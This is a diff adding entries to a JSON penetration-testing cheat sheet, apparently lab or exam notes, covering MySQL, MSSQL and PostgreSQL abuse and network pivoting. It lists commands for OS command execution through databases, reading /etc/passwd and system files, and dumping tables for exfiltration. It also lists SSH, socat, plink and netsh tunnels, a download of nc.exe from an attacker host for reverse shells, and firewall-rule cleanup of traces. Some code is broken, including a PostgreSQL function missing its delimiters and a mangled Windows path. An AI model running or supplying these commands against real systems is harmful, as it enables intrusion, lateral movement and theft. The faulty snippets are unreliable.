@@ -72,9 +72,309 @@
     {
       "id": 17,
       "Name": "Misc Windows"
+    },
+    {
+      "id": 18,
+      "Name": "Mysql Cheats"
+    },
+    {
+      "id": 19,
+      "Name": "MSSql Cheats"
+    },
+    {
+      "id": 20,
+      "Name": "PostGres Cheats"
     }
   ],
   "commands": [
+    {
+      "Name": "Dump MySQL Table to File",
+      "Category": 18,
+      "Description": "Export a MySQL table's contents to a server-side file using SELECT INTO OUTFILE, creating a dump for exfiltration or local analysis in Linux priv-esc chains.",
+      "Command": "SELECT * FROM table_name INTO OUTFILE '/tmp/dump.sql';"
+    },
+    {
+      "Name": "Run Shell Command MySQL UDF",
+      "Category": 18,
+      "Description": "Load a custom UDF to execute OS shell commands via MySQL if file privileges allow, enabling arbitrary command execution post-database compromise.",
+      "Command": "CREATE FUNCTION sys_exec RETURNS INT SONAME 'udf.so'; SELECT sys_exec('whoami');"
+    },
+    {
+      "Name": "Read System File MySQL",
+      "Category": 18,
+      "Description": "Ingest a system file like /etc/passwd into a MySQL table using LOAD DATA INFILE for enumeration of user accounts in escalated DB access.",
+      "Command": "LOAD DATA INFILE '/etc/passwd' INTO TABLE temp_table FIELDS TERMINATED BY ':';"
+    },
+    {
+      "Name": "Dump MSSQL Table to File",
+      "Category": 19,
+      "Description": "Export MSSQL table data to a BCP file for offline analysis, leveraging xp_cmdshell or OPENROWSET to write dumps during cross-platform priv-esc.",
+      "Command": "EXEC xp_cmdshell 'bcp \"SELECT * FROM database.dbo.table_name\" queryout \"C:\\temp\\dump.txt\" -c -T';"
+    },
+    {
+      "Name": "Run Shell Command MSSQL",
+      "Category": 19,
+      "Description": "Execute arbitrary OS commands on the MSSQL host using xp_cmdshell, bridging database access to system shell for Linux-like escalation from Windows.",
+      "Command": "EXEC xp_cmdshell 'whoami';"
+    },
+    {
+      "Name": "Read System File MSSQL",
+      "Category": 19,
+      "Description": "Incorporate Windows system files like SAM or hosts into MSSQL queries via OPENROWSET for credential or config enumeration in pivoted environments.",
+      "Command": "SELECT * FROM OPENROWSET('SQLOLEDB','Server=.;Trusted_Connection=yes;','BULK C:\\Windows\\System32\\drivers\\etc\\hosts');"
+    },
+    {
+      "Name": "Dump Postgres Table to File",
+      "Category": 20,
+      "Description": "Copy a PostgreSQL table's data to a CSV file on the server using COPY command, enabling file-based exfiltration in Linux priv-esc ops.",
+      "Command": "COPY (SELECT * FROM table_name) TO '/tmp/dump.csv' WITH CSV HEADER;"
+    },
+    {
+      "Name": "Run Shell Command Postgres",
+      "Category": 20,
+      "Description": "Execute system commands via a custom PL/Python function or extension in PostgreSQL, turning DB access into shell execution for escalation.",
+      "Command": "CREATE OR REPLACE FUNCTION sys_exec(text) RETURNS text AS   import subprocess; return subprocess.check_output($1, shell=True)   LANGUAGE plpythonu; SELECT sys_exec('whoami');"
+    },
+    {
+      "Name": "Read System File Postgres",
+      "Category": 20,
+      "Description": "Read a system file like /etc/passwd directly into PostgreSQL output using pg_read_file, requiring superuser perms for sensitive file enumeration in priv-esc.",
+      "Command": "SELECT pg_read_file('/etc/passwd');"
+    },
+    {
+      "Name": "Show MySQL Databases",
+      "Category": 18,
+      "Description": "Enumerate all accessible databases in a MySQL instance, often running as a privileged service, to identify targets for data exfiltration during Linux privilege escalation.",
+      "Command": "SHOW DATABASES;"
+    },
+    {
+      "Name": "Use MySQL Database",
+      "Category": 18,
+      "Description": "Switch to a specific database context in MySQL to prepare for table enumeration and querying, facilitating deeper reconnaissance in post-exploitation scenarios.",
+      "Command": "USE database_name;"
+    },
+    {
+      "Name": "Show MySQL Tables",
+      "Category": 18,
+      "Description": "List all tables within the current MySQL database to map schema and pinpoint sensitive data stores exploitable via escalated database access.",
+      "Command": "SHOW TABLES;"
+    },
+    {
+      "Name": "Describe MySQL Table",
+      "Category": 18,
+      "Description": "Display column details for a MySQL table to understand data structure and types, aiding in targeted SQL injection or dump operations during priv-esc.",
+      "Command": "DESCRIBE table_name;"
+    },
+    {
+      "Name": "Show MySQL Columns",
+      "Category": 18,
+      "Description": "Retrieve column names and types from a MySQL table for schema analysis, essential for crafting precise queries in compromised database environments.",
+      "Command": "SHOW COLUMNS FROM table_name;"
+    },
+    {
+      "Name": "Select All MySQL Records",
+      "Category": 18,
+      "Description": "Query all records from a MySQL table to dump data, leveraging privileged DB access gained through Linux service exploitation for credential harvesting.",
+      "Command": "SELECT * FROM table_name;"
+    },
+    {
+      "Name": "Show MySQL Users",
+      "Category": 18,
+      "Description": "Extract user accounts from MySQL's system tables to identify high-priv users or hashes for further escalation in integrated auth scenarios.",
+      "Command": "SELECT user, host FROM mysql.user;"
+    },
+    {
+      "Name": "Show MySQL Processes",
+      "Category": 18,
+      "Description": "List active MySQL connections and queries to spot admin sessions or inject into running processes during post-exploitation pivoting.",
+      "Command": "SHOW PROCESSLIST;"
+    },
+    {
+      "Name": "Show MSSQL Databases",
+      "Category": 19,
+      "Description": "List all databases in an MSSQL instance via system views, targeting Windows-integrated services exploitable from Linux priv-esc for lateral data access.",
+      "Command": "SELECT name FROM sys.databases;"
+    },
+    {
+      "Name": "Use MSSQL Database",
+      "Category": 19,
+      "Description": "Set the current database context in MSSQL to enable table and schema enumeration in compromised SQL Server environments during escalation chains.",
+      "Command": "USE database_name;"
+    },
+    {
+      "Name": "Show MSSQL Tables",
+      "Category": 19,
+      "Description": "Enumerate tables from MSSQL's information schema to map database structure, crucial for identifying sensitive tables post-Linux-to-Windows pivot.",
+      "Command": "SELECT * FROM information_schema.tables WHERE table_type = 'BASE TABLE';"
+    },
+    {
+      "Name": "Show MSSQL Columns",
+      "Category": 19,
+      "Description": "Query column metadata in MSSQL for a specific table to analyze data types and constraints, supporting advanced querying in priv-esc dumps.",
+      "Command": "SELECT * FROM information_schema.columns WHERE table_name = 'table_name';"
+    },
+    {
+      "Name": "Select All MSSQL Records",
+      "Category": 19,
+      "Description": "Retrieve all rows from an MSSQL table for data exfiltration, exploiting elevated DB perms obtained via service account compromise.",
+      "Command": "SELECT * FROM table_name;"
+    },
+    {
+      "Name": "Show MSSQL Users",
+      "Category": 19,
+      "Description": "List database users in MSSQL to uncover privileged accounts or roles for credential reuse in mixed Linux-Windows privilege escalation.",
+      "Command": "SELECT name FROM sys.database_principals;"
+    },
+    {
+      "Name": "Show MSSQL Processes",
+      "Category": 19,
+      "Description": "Display active sessions and queries in MSSQL to detect and potentially hijack admin connections during post-exploitation reconnaissance.",
+      "Command": "SELECT * FROM sys.dm_exec_sessions;"
+    },
+    {
+      "Name": "Show Postgres Databases",
+      "Category": 20,
+      "Description": "List all databases in PostgreSQL using system catalogs, targeting DB services with root-like access for initial mapping in Linux priv-esc.",
+      "Command": "\\l"
+    },
+    {
+      "Name": "Connect to Postgres DB",
+      "Category": 20,
+      "Description": "Connect to a specific PostgreSQL database to switch context for further enumeration, enabling schema exploration post-escalation.",
+      "Command": "\\c database_name"
+    },
+    {
+      "Name": "Show Postgres Tables",
+      "Category": 20,
+      "Description": "Display tables in the current PostgreSQL schema to identify data targets, vital for dumping in compromised DB instances.",
+      "Command": "\\dt"
+    },
+    {
+      "Name": "Describe Postgres Table",
+      "Category": 20,
+      "Description": "Output detailed structure of a PostgreSQL table, including columns and constraints, to inform targeted extractions during priv-esc.",
+      "Command": "\\d table_name"
+    },
+    {
+      "Name": "Show Postgres Columns",
+      "Category": 20,
+      "Description": "Query information schema in PostgreSQL for column details to understand table layout for precise SQL operations in escalated access.",
+      "Command": "SELECT * FROM information_schema.columns WHERE table_name = 'table_name';"
+    },
+    {
+      "Name": "Select All Postgres Records",
+      "Category": 20,
+      "Description": "Fetch all records from a PostgreSQL table for data harvesting, leveraging superuser perms gained through Linux service exploits.",
+      "Command": "SELECT * FROM table_name;"
+    },
+    {
+      "Name": "Show Postgres Users",
+      "Category": 20,
+      "Description": "Enumerate PostgreSQL roles and users to spot superusers or extract hashes for auth chaining in privilege escalation workflows.",
+      "Command": "SELECT rolname FROM pg_roles;"
+    },
+    {
+      "Name": "Show Postgres Processes",
+      "Category": 20,
+      "Description": "List active connections in PostgreSQL to identify ongoing sessions for potential takeover or monitoring in post-exploitation.",
+      "Command": "SELECT * FROM pg_stat_activity;"
+    },
+    {
+      "Name": "Socat TCP Forward",
+      "Category": 9,
+      "Description": "Establish a TCP port forward using socat to listen on local port 2222 and relay connections to a remote SSH server, enabling pivoting in post-exploitation phases of Linux privilege escalation.",
+      "Command": "socat -ddd TCP-LISTEN:2222,fork TCP:10.4.178.215:22"
+    },
+    {
+      "Name": "SMB Port Scan",
+      "Category": 7,
+      "Description": "Scan the 172.16.178.0/24 subnet for open SMB ports (445) using netcat to identify potential lateral movement targets during Linux priv-esc reconnaissance.",
+      "Command": "for i in $(seq 1 254); do nc -nvv -w1 -z 172.16.178.$i 445; done"
+    },
+    {
+      "Name": "SSH Local Forward",
+      "Category": 9,
+      "Description": "Set up an SSH local port forward to tunnel traffic from local port 4455 to a remote SMB service via a jump host, facilitating access to internal networks post-Linux escalation.",
+      "Command": "ssh -N -L 0.0.0.0:4455:172.16.178.217:445 dbadmin@10.4.178.215"
+    },
+    {
+      "Name": "SSH Dynamic Proxy",
+      "Category": 9,
+      "Description": "Create a dynamic SOCKS proxy via SSH on local port 9999 for routing traffic through a compromised host, aiding in anonymous pivoting after Linux privilege escalation.",
+      "Command": "ssh -N -D 0.0.0.0:9999 dbadmin@10.4.178.215"
+    },
+    {
+      "Name": "SSH Remote Forward SSH",
+      "Category": 9,
+      "Description": "Configure an SSH remote port forward to expose a local SSH service on the remote host's port 2222, enabling inbound connections for further exploitation in Linux post-exploitation.",
+      "Command": "ssh -N -R 127.0.0.1:2222:10.4.50.215:22 kali@192.168.118.4"
+    },
+    {
+      "Name": "SSH Remote Proxy",
+      "Category": 9,
+      "Description": "Initiate an SSH remote port forward on port 9997 for proxy chaining, supporting persistent access and tool routing in Linux privilege escalation scenarios.",
+      "Command": "ssh -N -R 9997 kali@192.168.45.159 #remember to update proxy chains to 127.0.0.1 9997"
+    },
+    {
+      "Name": "SSHuttle VPN Tunnel",
+      "Category": 9,
+      "Description": "Deploy sshuttle to create a VPN-like tunnel over SSH for specified subnets, allowing seamless traffic routing and lateral movement post-Linux escalation.",
+      "Command": "sshuttle -r database_admin@192.168.50.63:2222 10.4.178.0/24 172.16.178.0/24"
+    },
+    {
+      "Name": "SSH Remote Forward",
+      "Category": 9,
+      "Description": "Establish a basic SSH remote port forward on port 9997 to bridge networks and maintain access channels during Linux post-exploitation activities.",
+      "Command": "ssh -N -R 9997 kali@192.168.45.159"
+    },
+    {
+      "Name": "Plink RDP Forward",
+      "Category": 17,
+      "Description": "Use Plink to set up a remote port forward for RDP on port 9833, enabling Windows lateral movement from a Linux-compromised pivot in mixed-environment priv-esc chains.",
+      "Command": "plink.exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.159"
+    },
+    {
+      "Name": "Download Netcat",
+      "Category": 17,
+      "Description": "Download a netcat executable to a Windows temp directory using PowerShell wget, preparing for reverse shell or scanning tools in cross-platform Linux-to-Windows escalation.",
+      "Command": "wget -Uri http://192.168.45.159/nc.exe -OutFile C:\\Windows\\Temp\nc.exe"
+    },
+    {
+      "Name": "Add Port Proxy",
+      "Category": 17,
+      "Description": "Configure a Windows port proxy rule with netsh to forward traffic from local port 4545 to a remote host, supporting tunneling in post-exploitation from Linux pivots.",
+      "Command": "netsh interface portproxy add v4tov4 listenport=4545 listenaddress=192.168.178.64 connectport=4545 connectaddress=10.4.178.215"
+    },
+    {
+      "Name": "Show Port Proxies",
+      "Category": 17,
+      "Description": "Display all configured port proxy rules on Windows to verify forwarding setups during mixed Linux-Windows privilege escalation verification.",
+      "Command": "netsh interface portproxy show all"
+    },
+    {
+      "Name": "Check Port Status",
+      "Category": 14,
+      "Description": "Examine network connections for a specific port (4545) using netstat to confirm listening services in Linux post-exploitation network enumeration.",
+      "Command": "netstat -anp TCP | find \"4545\""
+    },
+    {
+      "Name": "Add Firewall Rule",
+      "Category": 17,
+      "Description": "Add an inbound Windows firewall rule to allow TCP traffic on port 4545, ensuring port forwards remain accessible in Linux-initiated lateral attacks.",
+      "Command": "netsh advfirewall firewall add rule name=\"port_forward_ssh_4545\" protocol=TCP dir=in localip=192.168.178.64 localport=4545 action=allow"
+    },
+    {
+      "Name": "Delete Firewall Rule",
+      "Category": 17,
+      "Description": "Remove a specific Windows firewall rule to clean up traces of port forwarding configurations after testing in a Linux priv-esc engagement.",
+      "Command": "netsh advfirewall firewall delete rule name=\"port_forward_ssh_4545\""
+    },
+    {
+      "Name": "Delete Port Proxy",
+      "Category": 17,
+      "Description": "Delete a Windows port proxy rule to dismantle forwarding setups and maintain operational security post-Linux privilege escalation activities.",
+      "Command": "netsh interface portproxy del v4tov4 listenport=4545 listenaddress=192.168.178.64"
+    },
     {
       "Name": "Check User ID",
       "Category": 9,
